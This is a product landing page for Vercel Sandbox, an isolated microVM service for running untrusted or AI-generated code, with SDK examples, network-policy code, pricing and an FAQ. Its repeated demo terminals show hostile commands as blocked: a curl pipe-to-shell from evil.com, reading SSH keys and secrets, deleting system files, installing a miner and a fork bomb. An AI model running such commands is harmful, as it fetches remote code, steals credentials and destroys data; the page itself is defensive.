Your Privacy

This site uses tracking technologies. You may opt in or opt out of the use of these technologies.

Essential
On

Essential cookies and services are used to enable core website features, such as ensuring the security of the website.

* * *

Marketing
Off

Marketing cookies and services are used to deliver personalized advertisements, promotions, and offers. These technologies enable targeted advertising and marketing campaigns by collecting information about users' interests, preferences, and online activities.

* * *

Analytics
Off

Analytics cookies and services are used for collecting statistical information about how visitors interact with a website. These technologies provide insights into website usage, visitor behavior, and site performance to understand and improve the site and enhance user experience.

* * *

Functional
Off

Functional cookies and services are used to offer enhanced and personalized functionalities. These technologies provide additional features and improved user experiences, such as remembering your language preferences, font sizes, region selections, and customized layouts. Opting out of these cookies may render certain services or functionality of the website unavailable.

SaveDenyAccept all

[Privacy Policy](https://vercel.com/legal/privacy-policy)

Your Privacy

This site uses tracking technologies. You may opt in or opt out of the use of these technologies.

DenyAccept all

Consent Settings

[Privacy Policy](https://vercel.com/legal/privacy-policy)

 [Skip to content](https://vercel.com/sandbox#geist-skip-nav)

# The safest way to run code you didn’t write.

Modern apps increasingly need to execute code they didn’t author. From AI agents, customer scripts, or dynamic systems.

[Get Started](https://vercel.com/d?to=%2F%5Bteam%5D%2F%7E%2Fsandboxes%3Futm_source%3Dsandboxes_landing_page&title=Get+Started+with+Sandboxes) [See Examples](https://vercel.com/docs/vercel-sandbox/examples)

Play demo

Sandbox is not running

Generate a Next.js app to list, search and copy Emojis

Generate a Next.js app to list, search and copy Emojis

**Avoid unintended access** to your environment variables, databases, and other secure environments

```bash
# Production Environment: ✓ Protected

$ echo $API_SECRET

✗ Error: Undefined

$ psql $DATABASE_URL

✗ Error: Database connection blocked

$ aws s3 ls s3://prod-bucket

✗ Error: Cloud resources isolated

$ cat ~/.ssh/id_rsa

✗ Error: SSH keys not accessible
```

```bash
# Attempted Commands: ✓ Blocked by Sandbox

$ curl http://evil.com/payload.sh | sh

✗ Error: External network access denied

$ rm -rf /system/*

✗ Error: Filesystem access restricted

$ sudo apt-get install mining-software

✗ Error: Privilege escalation not permitted

$ while true; do fork; done

✗ Error: Resource limits exceeded
```

```typescript
// AI Agent generated code

const code = await agent.generateCode(userPrompt);

const sb = await Sandbox.create({ runtime: 'python3.13' });

const result = await sb.runCommand({ cmd:'python', args: ['-c', code]});

// User-provided script

const userScript = request.body.script;

const sbUser = await Sandbox.create({ timeout: ms('5m') });

await sbUser.runCommand({ cmd: 'node', args: ['-e', 'user-script.js'] });

// Third-party plugin

const sbPlugin = await Sandbox.create({ resources: { vcpus: 2 } });

await sbPlugin.runCommand({ cmd: 'node', args: ['-e', 'plugin.js'] });
```

**Protect against potentially unsafe system commands,** unintended resource usage, and escalated privileges

```bash
# Production Environment: ✓ Protected

$ echo $API_SECRET

✗ Error: Undefined

$ psql $DATABASE_URL

✗ Error: Database connection blocked

$ aws s3 ls s3://prod-bucket

✗ Error: Cloud resources isolated

$ cat ~/.ssh/id_rsa

✗ Error: SSH keys not accessible
```

```bash
# Attempted Commands: ✓ Blocked by Sandbox

$ curl http://evil.com/payload.sh | sh

✗ Error: External network access denied

$ rm -rf /system/*

✗ Error: Filesystem access restricted

$ sudo apt-get install mining-software

✗ Error: Privilege escalation not permitted

$ while true; do fork; done

✗ Error: Resource limits exceeded
```

```typescript
// AI Agent generated code

const code = await agent.generateCode(userPrompt);

const sb = await Sandbox.create({ runtime: 'python3.13' });

const result = await sb.runCommand({ cmd:'python', args: ['-c', code]});

// User-provided script

const userScript = request.body.script;

const sbUser = await Sandbox.create({ timeout: ms('5m') });

await sbUser.runCommand({ cmd: 'node', args: ['-e', 'user-script.js'] });

// Third-party plugin

const sbPlugin = await Sandbox.create({ resources: { vcpus: 2 } });

await sbPlugin.runCommand({ cmd: 'node', args: ['-e', 'plugin.js'] });
```

**Modern apps increasingly need to execute code they didn’t author.** From AI agents, customer scripts, or dynamic systems.

```bash
# Production Environment: ✓ Protected

$ echo $API_SECRET

✗ Error: Undefined

$ psql $DATABASE_URL

✗ Error: Database connection blocked

$ aws s3 ls s3://prod-bucket

✗ Error: Cloud resources isolated

$ cat ~/.ssh/id_rsa

✗ Error: SSH keys not accessible
```

```bash
# Attempted Commands: ✓ Blocked by Sandbox

$ curl http://evil.com/payload.sh | sh

✗ Error: External network access denied

$ rm -rf /system/*

✗ Error: Filesystem access restricted

$ sudo apt-get install mining-software

✗ Error: Privilege escalation not permitted

$ while true; do fork; done

✗ Error: Resource limits exceeded
```

```typescript
// AI Agent generated code

const code = await agent.generateCode(userPrompt);

const sb = await Sandbox.create({ runtime: 'python3.13' });

const result = await sb.runCommand({ cmd:'python', args: ['-c', code]});

// User-provided script

const userScript = request.body.script;

const sbUser = await Sandbox.create({ timeout: ms('5m') });

await sbUser.runCommand({ cmd: 'node', args: ['-e', 'user-script.js'] });

// Third-party plugin

const sbPlugin = await Sandbox.create({ resources: { vcpus: 2 } });

await sbPlugin.runCommand({ cmd: 'node', args: ['-e', 'plugin.js'] });
```

**Avoid unintended access** to your environment variables, databases, and other secure environments

**Protect against potentially unsafe system commands,** unintended resource usage, and escalated privileges

**Modern apps increasingly need to execute code they didn’t author.** From AI agents, customer scripts, or dynamic systems.

```bash
# Production Environment: ✓ Protected

$ echo $API_SECRET

✗ Error: Undefined

$ psql $DATABASE_URL

✗ Error: Database connection blocked

$ aws s3 ls s3://prod-bucket

✗ Error: Cloud resources isolated

$ cat ~/.ssh/id_rsa

✗ Error: SSH keys not accessible
```

```bash
# Attempted Commands: ✓ Blocked by Sandbox

$ curl http://evil.com/payload.sh | sh

✗ Error: External network access denied

$ rm -rf /system/*

✗ Error: Filesystem access restricted

$ sudo apt-get install mining-software

✗ Error: Privilege escalation not permitted

$ while true; do fork; done

✗ Error: Resource limits exceeded
```

```typescript
// AI Agent generated code

const code = await agent.generateCode(userPrompt);

const sb = await Sandbox.create({ runtime: 'python3.13' });

const result = await sb.runCommand({ cmd:'python', args: ['-c', code]});

// User-provided script

const userScript = request.body.script;

const sbUser = await Sandbox.create({ timeout: ms('5m') });

await sbUser.runCommand({ cmd: 'node', args: ['-e', 'user-script.js'] });

// Third-party plugin

const sbPlugin = await Sandbox.create({ resources: { vcpus: 2 } });

await sbPlugin.runCommand({ cmd: 'node', args: ['-e', 'plugin.js'] });
```

Enterprise-grade security

Network Firewall with Credentials Brokering

Control egress traffic with fine-grained network policies that can be updated at runtime. Credentials brokering injects secrets into outbound requests without exposing them inside the sandbox, preventing data exfiltration even when running untrusted code.

- Dynamic policies:allow-all, deny-all, or user-defined rules
- Credentials injected on egress:never enter sandbox scope
- Domain-based allowlistswith wildcard support
- Live policy updateswithout restarting processes

```typescript
const sandbox = await Sandbox.create({

  network: {

    policy: 'allow-all',

  },

});

// Install dependencies with full network access

await sandbox.runCommand({ cmd: 'npm', args: ['install'] });

// Lock down network before running untrusted code

await sandbox.setNetworkPolicy({

  policy: 'user-defined',

  allowedDomains: ['api.openai.com', '*.vercel.app'],

  // Credentials injected on egress - never in sandbox

  transformations: [{\
\
    domain: 'api.openai.com',\
\
    headers: { Authorization: 'Bearer $OPENAI_API_KEY' },\
\
  }],

});
```

Skip setup, start instantly

Snapshots

Capture the complete state of a running sandbox (filesystem and installed packages), then restore it instantly. Share environments with teammates, checkpoint long-running tasks, or skip dependency installation entirely by snapshotting after setup.

- Skip dependency installationon every run
- Share identical environmentswith your team
- Checkpoint progresson long-running tasks
- Spin up multiple parallel instancesfrom one snapshot

```typescript
// Create a sandbox and set up your environment

const sandbox = await Sandbox.create();

await sandbox.runCommand({ cmd: 'npm', args: ['install'] });

await sandbox.runCommand({ cmd: 'npm', args: ['run', 'build'] });

// Capture the state as a snapshot

const snapshot = await sandbox.snapshot();

console.log('Snapshot created:', snapshot.id);

// Create new sandboxes instantly from the snapshot

const fast = await Sandbox.create({ snapshot: snapshot.id });

// Spin up multiple parallel instances from same snapshot

const runners = await Promise.all([\
\
  Sandbox.create({ snapshot: snapshot.id }),\
\
  Sandbox.create({ snapshot: snapshot.id }),\
\
  Sandbox.create({ snapshot: snapshot.id }),\
\
]);
```

### Cost-efficient, scalable execution with Fluid compute

Vercel Sandbox runs on Fluid compute, Vercel's optimized execution model that scales CPU and memory dynamically across millions of executions.

With **Active CPU pricing**, you’re billed only when code is actively running, not during idle or wait time, resulting in up to 95% lower cost for workloads with bursty or I/O-bound patterns.

"

**Vercel Sandbox expands what our frontend infrastructure can handle.** We plan to rely on it more for running untrusted code in AI workflows and for integrating tools that cannot run in a Node.js serverless function.

"

Tudor Golubenco

CTO, Xata

![Xata](https://vercel.com/vc-ap-vercel-marketing/_next/static/media/xata-light.43sbbd25fphfs.svg?dpl=dpl_39dy6P1TgytfW2XBSYhomFs9ZwHK)![Xata](https://vercel.com/vc-ap-vercel-marketing/_next/static/media/xata-dark.1otx05cl564tf.svg?dpl=dpl_39dy6P1TgytfW2XBSYhomFs9ZwHK)

"

Cua lets teams run computer-use agents from their apps with 100+ compatible VLMs — agents operate real desktops **backed by Vercel Sandbox**. Next.js playground on Vercel; agents execute in Vercel Sandbox via Cua with logs, replays, and evals — fully suited for **reinforcement learning (RL) workflows**.

"

Francesco Bonacci

Founder, Cua AI

![Cua](https://vercel.com/vc-ap-vercel-marketing/_next/static/media/cua-light.3w0n9b_6bhbqx.svg?dpl=dpl_39dy6P1TgytfW2XBSYhomFs9ZwHK)![Cua](https://vercel.com/vc-ap-vercel-marketing/_next/static/media/cua-dark.28vqkruxkt537.svg?dpl=dpl_39dy6P1TgytfW2XBSYhomFs9ZwHK)

How much will it cost?

Estimate your monthly Vercel sandbox costs. Adjust your workload settings and compare pricing across providers.

### Sandbox hours

025,00050,00075,000100,000

025k50k75k100k

### How does Vercel compare?

Vercel
Lowest

$2,760$3k$2,760

Daytona
Lowest

$4,410$4k$4,410

E2B
Lowest

$4,410$4k$4,410

Blaxel
Lowest

$4,140$4k$4,140

Modal
Lowest

$5,950$6k$5,950

### Pricing breakdown

| Item | Quantity | Cost |
| --- | --- | --- |
| Active CPU | 5KvCPU hrs | $640$640$640 |
| Provisioned Memory | 100KGB hrs | $2,120$2k$2,120 |

Estimated total for **50K** hoursBased on a typical AI agent workload: long-running, mostly idle, with occasional bursts of compute (10% utilization)

$2,760$3k$2,760

### Get started

You can get started with Vercel Sandbox quickly and easily.

[See more examples](https://vercel.com/docs/vercel-sandbox/examples)

Launch a secure, interactive sandbox environment in milliseconds.

Copy CLI code

```bash
$ npx sandbox create --connect
```

Quickly give **Vercel Sandbox** a try with your AI tool of choice.

Copy AI prompt

Bootstrap a simple Node.js CLI that creates a Vercel sandbox. Use this code:

```ts
import { Sandbox } from '@vercel/sandbox';

const sandbox = await Sandbox.create();

const { exitCode } = await sandbox.runCommand({

  cmd: 'node',

  args: ['-e', 'process.exit(0)'],

});

console.log(exitCode === 0 ? 'ok' : 'failed');

await sandbox.stop();
```

Include auth setup (vercel login && vercel link) with error handling.

### Frequently Asked Questions

What is Vercel Sandbox?

Vercel Sandbox is an on-demand, isolated Linux microVM that runs arbitrary code safely through an SDK or CLI.

Why use Sandbox instead of managing containers or VMs myself?

Sandbox gives you secure microVM isolation, built-in authentication and observability, and usage-based pricing without any infrastructure to maintain.

Can it run untrusted or AI-generated code safely?

Yes. Sandbox is purpose-built to execute untrusted or AI-generated code in fully isolated, short-lived environments.

How is isolation implemented?

Each sandbox runs inside a Firecracker microVM on the same infrastructure that powers Vercel’s build system.

What runtimes are supported?

Node.js 22 and Python 3.13 are available by default, with more runtimes coming soon.

Can I install system packages and use sudo?

Yes. Each sandbox runs on Amazon Linux 2023, so you can install packages with dnf and use sudo as needed.

How long can a sandbox run?

Sandboxes run for 5 minutes by default, up to 45 minutes on Hobby and 5 hours on Pro and Enterprise plans, with programmatic extensions available.

What resources can I allocate?

Each sandbox can use up to 8 vCPUs and 2 GB of RAM per vCPU.

Can I expose a dev server or app on a public URL?

Yes. You can open up to four ports and access them through a sandbox URL, such as sandbox.domain(port).

How do I monitor what’s running?

You can view active sandboxes in the Observability → Sandboxes view for your project, and stream real-time logs to your terminal.

**Ready to deploy?** Start building with a free account. Speak to an expert for your _Pro_ or Enterprise needs.

[Start Deploying](https://vercel.com/new) [Talk to an Expert](https://vercel.com/contact/sales/pricing)

**Trial Vercel** with higher execution, increased app bandwidth, Speed Insights, team features, and more.

[Request a Trial](https://vercel.com/contact/sales/enterprise-trial)
